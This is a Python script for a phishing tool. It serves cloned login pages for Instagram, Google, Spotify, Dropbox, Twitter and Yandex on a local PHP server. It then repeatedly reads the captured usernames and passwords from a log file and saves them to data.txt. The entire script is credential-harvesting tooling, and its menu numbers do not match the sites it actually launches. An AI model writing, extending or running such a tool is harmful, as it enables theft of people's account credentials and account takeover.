import sys
import os
import re
import time
import random
import subprocess
# Try to import error
try:
    os.system("clear")
    import requests
except ImportError:
    print("Import requests module \n pip3 install requests")
except KeyboardInterrupt:
    print("[!] Exiting")
    sys.exit()


# Define some color code-----------------------
r = '\033[31;1m'
g = "\033[32;1m"
o = "\033[33;1m"
pu = "\033[35;1m"
c = "\033[36;1m"
y = "\033[93;1m"
w = "\033[0;1m"
p = "\033[95;1m"
# Color coding end here
# Make a banner function here-------------------


def banner():
    print(f"""{pu}
 $$$$$$\  $$$$$$$$\ $$\   $$\ 
$$  __$$\ $$  _____|$$ | $$  |
$$ /  \__|$$ |      $$ |$$  / 
$$ |      $$$$$\    $$$$$  /  
$$ |      $$  __|   $$  $$<   
$$ |  $$\ $$ |      $$ |\$$\  
\$$$$$$  |$$$$$$$$\ $$ | \$$\ 
 \______/ \________|\__|  \__|
                              
                                """)


banner()





def mk_dir():
    try:
        os.makedirs("pweb")
    except FileExistsError:
        print()
    except:
        print(f"{w} ----Someting went wrong------")


mk_dir()
# Dir function end here
# Make a function for user data---------


def user_data(server):
    while True:
        if os.path.exists(f"pweb/{server}/userlog.txt"):
            print(f"{w}[{g}+{w}] {y} User data found")
            os.system(f"cat pweb/{server}/userlog.txt")
            os.system(f"cat pweb/{server}/userlog.txt >> data.txt")
            print()
            print(f"{y}[{g}+{y}] {r} Username and password saved into data.txt")
            os.system(f"rm -rf pweb/{server}/userlog.txt")
        else:
            pass


# Make a function for handling Localhost
def l_host(server):
    path = f"sites/{server}"
    des = "pweb/"
    os.system(f"cp -R {path} {des}")
   
    port_ = "3000"
    os.system(
        f"php -S 127.0.0.1:{port_} -t pweb/{server} > /dev/null 2>&1 & sleep 2")
    print(f"{r}[{w}+{r}] {g} Localhost started on http://127.0.0.1:{port_}")
    user_data(server)

# Asking for link forwoding option
def host_optn(server):
    l_host(server)

# Make options for websites..


def optn():
    print(f"{y}[{g}01{y}] {c} Instagram     {y}[{g}05{y}] {c} Dropbox ")
    print(f"{y}[{g}02{y}] {c} Spotify       {y}[{g}06{y}] {c} Twitter ")
    print(f"{y}[{g}03{y}] {c} Google        {y}[{g}07{y}] {c} Yandex ")


optn()
# Let's read the user input----------
print("\n")
try:
    optn = input(f"{w}[{g}×{w}] {p} Choose an option: ")
except KeyboardInterrupt:
    time.sleep(1)
    sys.exit()
# Make handle for user input----------------
if optn == '1' or optn == '01':
    host_optn("instagram")
elif optn == '2' or optn == '02':
    host_optn("google")
elif optn == '3' or optn == '03':
    host_optn("spotify")
elif optn == '4' or optn == '04':
    host_optn("dropbox")
elif optn == '5' or optn == '05':
    host_optn("twitter")
elif optn == '6' or optn == '06':
    host_optn("yandex")
else:
    print("\n")
    print(f"{r}[{y}!{r}] {g} Invalid option ")
    time.sleep(1)
    sys.exit()

